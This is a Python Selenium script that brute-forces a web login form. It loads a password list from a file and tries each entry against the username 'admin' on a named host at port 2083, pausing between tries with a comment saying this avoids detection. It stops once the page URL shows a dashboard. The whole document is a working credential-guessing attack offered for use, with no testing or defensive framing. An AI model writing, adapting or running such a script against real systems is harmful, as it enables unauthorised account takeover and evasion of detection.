import time
from selenium import webdriver

def login_with_password(driver, username, password):
    driver.get("https://aktivasi-tarif.aksespro.org:2083/")  # Replace with your login page URL
    driver.find_element("id", "user").send_keys(username)  # Replace "username" with the actual ID of the username input field
    driver.find_element("id", "pass").send_keys(password)  # Replace "password" with the actual ID of the password input field
    driver.find_element("id", "login_submit").click()  # Replace "login_button" with the actual ID of the login button

def try_passwords(driver, username, password_list):
    for password in password_list:
        print("Trying password:", password)
        login_with_password(driver, username, password)
        time.sleep(1)  # Wait for a few seconds to avoid detection
        if "dashboard" in driver.current_url:  # Replace "dashboard" with a keyword in the URL after successful login
            print("Login successful!")
            break
    else:
        print("All passwords tried, login failed.")

def main():
    # Initialize Selenium WebDriver
    driver = webdriver.Chrome()  # You can replace "Chrome" with the browser of your choice
    driver.implicitly_wait(10)  # Implicitly wait for elements to appear before raising exception

    # Your login credentials
    username = "admin"
    password_list_file = "passwords.txt"  # Name of the file containing passwords

    # Read passwords from file
    with open(password_list_file, "r", encoding="ISO-8859-1") as f:
        password_list = [line.strip() for line in f]

    # Try logging in with the provided password list
    try_passwords(driver, username, password_list)

    # Close the WebDriver session
    driver.quit()

if __name__ == "__main__":
    main()
